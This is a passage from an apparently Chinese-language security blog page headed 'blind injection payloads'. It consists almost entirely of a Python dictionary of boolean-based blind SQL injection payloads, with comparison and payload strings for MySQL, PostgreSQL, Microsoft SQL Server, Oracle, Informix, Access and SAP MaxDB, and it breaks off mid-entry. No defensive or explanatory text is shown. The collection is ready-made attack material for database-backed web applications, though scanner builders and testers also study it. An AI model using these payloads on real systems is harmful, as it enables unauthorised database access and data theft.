<h4 id="2-2-盲注payload"><a href="#2-2-盲注payload" class="headerlink" title="2.2  盲注payload"></a>2.2  盲注payload</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line">bool_blind_injection = &#123;</span><br><span class="line"></span><br><span class="line">    "INJPAY_27":</span><br><span class="line">        &#123;</span><br><span class="line">            'comparsion': ' and (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_26":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> [ORIGVALUE] <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> [ORIGVALUE] <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_25":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_24":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_23":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_22":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> ([RANDNUM]=[RANDNUM1])*[ORIGVALUE]<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">and</span> ([RANDNUM]=[RANDNUM])*[ORIGVALUE]<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_21":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> ([RANDNUM]=[RANDNUM1])*[RANDNUM1]<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">and</span> ([RANDNUM]=[RANDNUM])*[RANDNUM1]<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_20":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">ELT</span>([RANDNUM]=[RANDNUM1],[ORIGVALUE])<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],[ORIGVALUE])<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_50":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">HAVING</span> [RANDNUM]=[RANDNUM1]<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">', '</span>payload<span class="string">': '</span> <span class="keyword">HAVING</span> [RANDNUM]=[RANDNUM]<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_29":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span><span class="keyword">Oracle</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_28":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_51":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ;<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS) <span class="keyword">END</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ;<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS) <span class="keyword">END</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_38":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_39":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">', '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_55":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ;<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ;<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_58":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> ;<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> [RANDNUM]=[RANDNUM1] <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="literal">NULL</span> <span class="keyword">END</span><span class="string">', '</span>dbms<span class="string">': '</span>SAP MaxDB<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> ;<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> [RANDNUM]=[RANDNUM] <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="literal">NULL</span> <span class="keyword">END</span><span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_30":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span><span class="keyword">Oracle</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_31":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="number">1</span>/<span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> SYSMASTER:SYSDUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>Informix<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="number">1</span>/<span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> SYSMASTER:SYSDUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_32":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM] <span class="keyword">END</span>) <span class="keyword">FROM</span> SYSMASTER:SYSDUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>Informix<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM] <span class="keyword">END</span>) <span class="keyword">FROM</span> SYSMASTER:SYSDUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_33":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">IIF</span>([RANDNUM]=[RANDNUM1],[RANDNUM],<span class="number">1</span>/<span class="number">0</span>)<span class="string">', '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">Access</span><span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">IIF</span>([RANDNUM]=[RANDNUM],[RANDNUM],<span class="number">1</span>/<span class="number">0</span>)<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_34":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">IIF</span>([RANDNUM]=[RANDNUM1],[ORIGVALUE],<span class="number">1</span>/<span class="number">0</span>)<span class="string">', '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">Access</span><span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">IIF</span>([RANDNUM]=[RANDNUM],[ORIGVALUE],<span class="number">1</span>/<span class="number">0</span>)<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_35":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> DUAL <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM1] <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> DUAL <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM1] <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': 